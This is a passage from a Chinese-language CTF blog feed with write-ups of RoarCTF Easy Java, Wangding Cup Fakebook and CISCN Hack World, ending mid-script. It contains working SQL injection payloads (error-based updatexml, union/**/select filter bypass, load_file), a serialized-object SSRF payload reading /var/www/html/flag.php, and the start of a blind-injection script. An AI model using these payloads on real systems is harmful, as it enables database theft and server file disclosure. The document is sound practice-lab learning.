href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>试了sql注入，点了hlep，然后试了一下常规的目录穿越，无果<br>用dirsearch扫出了&#x2F;images 访问，404，<br>得到服务器信息：<br>Apache Tomcat&#x2F;8.5.24  是一个基于java的服务端<br>直接访问了help.docx<br><a href="http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx">http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx</a><br>下载help.docx<br>里面只有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docx">Are you sure the flag is here? ? ?<br></code></pre></td></tr></table></figure><p>web题就不考虑docx隐写啥的了  </p><p>看wp：<br><a href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a><br><a href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a>  </p><p>直接搬过来：<br>WEB-INF 是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。  </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata"> WEB-<span class="hljs-keyword">INF</span>主要包含以下文件或目录：<br>/WEB-<span class="hljs-keyword">INF</span>/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-<span class="hljs-keyword">INF</span>/classes/：含了站点所有用的 <span class="hljs-keyword">class</span> 文件，包括 servlet <span class="hljs-keyword">class</span> 和非servlet <span class="hljs-keyword">class</span>，他们不能包含在 .jar文件中<br>/WEB-<span class="hljs-keyword">INF</span>/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-<span class="hljs-keyword">INF</span>/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-<span class="hljs-keyword">INF</span>/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure><p>web.xml里记有映射的文件，似乎是把url的请求映射到指定的编译号的java程序，class文件，可能和php文件差不多吧  </p><p><a href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a><br>说的很清楚了  </p><p>漏洞成因：<br><a href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a>    </p><p>反正最后是用download文件下载了flagcontainer的class文件，应该就是程序的源码？<br>或者啥的<br>然后里面有base64的flag  </p><p>这题如题，ez java<br>没接触过，不懂    </p><h2 id="class-文件是什么"><a href="#class-文件是什么" class="headerlink" title=".class 文件是什么"></a>.class 文件是什么</h2><p>.class 文件是Java编译器生成的字节码文件，它包含了Java源代码编译后的二进制表示。Java虚拟机（JVM）可以直接执行这些字节码文件，而无需依赖特定的硬件平台或操作系统</p><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>上来是一个登录和注册页面，说分享故事啥的<br>上来养成好习惯，先按f12看一下前端留有啥，<br>搜了一下flag和php，没发现有啥  </p><p>那就用bp fuzz一下login界面<br>视乎无法注入  </p><p>然后再join试了好多，都是blog is not valid<br>扫了一下服务器：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[00:10:49]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /js  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/js/</span><br><span class="hljs-selector-attr">[00:11:17]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:11:37]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:11:57]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpeg</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpg</span><br><span class="hljs-selector-attr">[00:12:33]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:16:13]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /adm/style/admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:17:30]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /admin_my_avatar<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:21:17]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /css  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/css/</span><br><span class="hljs-selector-attr">[00:21:28]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /db<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:15]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /error<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:32]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">6</span>KB - /favicon<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:22:42]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /flag<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">571</span>B  - /js/<br><span class="hljs-selector-attr">[00:24:35]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:40]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /logo<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:27:44]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /resources/<span class="hljs-selector-class">.arch-internal-preview</span><span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:27:49]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">37</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[00:28:36]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /skin1_admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:29:57]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /user<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:30:20]</span> <span class="hljs-number">200</span> - <span class="hljs-number">1019</span>B  - /view.php<br></code></pre></td></tr></table></figure><p>有robots.txt,里面提示有一个<br>user.php.bak<br>备份文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>给deepseek一看，它说有ssrf漏洞，还没接触过呢<br>然后也是看懂这个网站的逻辑了，就是你能注册姓名和账号，然后把你的blog链接挂上去<br>所以blog那栏必须是域名还得是二级域名啥的，  </p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">便尝试：<br>http://cd541869-c627<span class="hljs-string">-4</span>baf<span class="hljs-string">-920</span>d<span class="hljs-string">-2</span>fd4728ad4f0.node5.buuoj.cn:81/flag.php<br>放上去当作blog链接<br></code></pre></td></tr></table></figure><p>一次放我正常的blog链接，<br>一次放：<br><a href="http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php">http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php</a>  </p><p>没思路，不知道怎么下手，找wp看吧  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">先访问<br>/<span class="hljs-keyword">view</span>.php<br>得到<br><br><span class="hljs-keyword">Notice</span>: Undefined <span class="hljs-keyword">index</span>: <span class="hljs-keyword">no</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">view</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br>[*] query error! (You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MariaDB <span class="hljs-keyword">server</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;&#x27;</span> at <span class="hljs-type">line</span> <span class="hljs-number">1</span>)<br><br><br>Fatal error: <span class="hljs-keyword">Call</span> <span class="hljs-keyword">to</span> a member <span class="hljs-keyword">function</span> fetch_assoc() <span class="hljs-keyword">on</span> <span class="hljs-type">boolean</span> <span class="hljs-keyword">in</span> /var/www/html/db.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">66</span><br><br>可以知道站点目录<br></code></pre></td></tr></table></figure><p>看网上的wp(<a href="https://blog.csdn.net/MyZy_/article/details/143814939)%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%EF%BC%9A">https://blog.csdn.net/MyZy_/article/details/143814939)方法就是：</a><br>先上传一个符合规则的信息，然后使用sql注入把信息中博客url改为本地访问flag.php<br>或者因为没过滤sql的file_load()，可以直接读取flag.php  </p><p>那就先用自己的github地址注册一条信息<br>然后在&#x2F;view.php?on&#x3D;1中进行注入<br>然后发现现在的buuctf好像为了防止靶机变成肉鸡，不给出网了<br>那没办法，去nssctf上做吧  </p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span>&lt;&gt;<span class="hljs-keyword">select</span>&lt;&gt;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+<br><span class="hljs-comment">//不行</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,database()),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!fakebook&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-built_in">tables</span>))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!users,ALL_PLUGINS,APPLICABLE_RO&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!no,username,passwd,data,PLUGIN_&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(no,username,passwd,data))<span class="hljs-keyword">from</span>(users))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!1zhong3c9909afec25354d551dae215&#x27;)</span><br><span class="hljs-comment">//经典的报错注入回显不完全，这里的passwd应该是就是被加密过的，不然原密码是&#x27;123&#x27;</span><br><span class="hljs-comment">//注意看了一下网上的wp，好像过滤了&#x27;union select&#x27;,使用&#x27;union/**/select&#x27;可以绕过  </span><br><br><span class="hljs-number">1</span> order <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> --<br><span class="hljs-comment">//知道了行列为4</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> --<br><span class="hljs-comment">//知道回显位置是2</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(no,<span class="hljs-string">&quot;\n&quot;</span>,username,<span class="hljs-string">&quot;\n&quot;</span>,passwd,<span class="hljs-string">&quot;\n&quot;</span>,data),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users --<br><span class="hljs-comment">//1 zhong </span><br><span class="hljs-number">3</span>c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2 <br>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;http://gwwafz.online/&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这是时候如wp说的，在data里构造一条读取本地flag的链接即可  </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">-<span class="hljs-number">1</span> union/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27; from users <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>网页会在blog的区域回显blog链接爬取到的页面，改为file:&#x2F;&#x2F;可以直接访问本地的flag.php源码，所以在f12中查看blog窗口元素即可看，可能是它这个题目的原因，正常的blog也无法显示<br>只能在源码查看了  </p><p>解法二：<br>时用sql的load_file()函数，直接读取flag.php<br>注入时传入：  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(&quot;/var/www/html/flag.php&quot;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>file:&#x2F;&#x2F;&#x2F;<br>中是有3个&#x2F;  </p><p>还有，为什么传入sql语句<br>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –<br>就能访问到flag.php<br>首先select语句若是没有搜索到东西会自己变成自己添加的数据<br>所以-1没搜索到，会等于自己新建一条数据发给后端语句<br>原语句：  </p><p>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –</p><p>传入db后db会处理好然后将结果返回语句，其中union select就相当于新建了一条sql查询结果返回  </p><p>所以后端源码接收到的sql select 数据就为：  </p><p>1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’</p><p>然后将其中data反序列化(看源码)后执行<br>其中1，2，3为另外3条column，改data那条column即可  </p><p>然后刚才扫目录时发现了有个<br>db.php<br>可以猜测存在数据库，所以对no进行注入尝试   </p><p><strong>ssrf漏洞：</strong><br>我觉得是<br>利用网站对外访问来进行攻击<br>比如这题有curl类的函数  </p><p>看nssctf的标签有ssrf<br>第一次做ssrf的题目  </p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-32</title>
    <link href="/2025/05/01/note-32/"/>
    <url>/2025/05/01/note-32/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>buucft里提示有sql，上来给了个输入框，但是是post而，抓包看：  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后就是对id进行注入了,<br>用bp fuzz一下,大概过滤了</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">空格<br>or<br><span class="hljs-string">||</span><br>and<br><span class="hljs-meta">&amp;&amp;</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-punctuation">;</span><br>&#x27;xmlupdate()<br>/**/<br>`<br></code></pre></td></tr></table></figure><p>试出如下</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">1^(length(database())=2)<br><br>若是length是对的会返回：<br><span class="hljs-keyword">Error </span>Occured When Fetch Result.<br><br>否则返回：<br>Hello, glzjin wants a girlfriend.<br></code></pre></td></tr></table></figure><p>由此可以对进行盲注<br>先用bp已经测试出数据库长度为11；<br>找个脚本改改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://69638964-21bc-445d-a323-6de57b0ff6bb.node5.buuoj.cn:81/&#x27;</span><br>database_name=<span 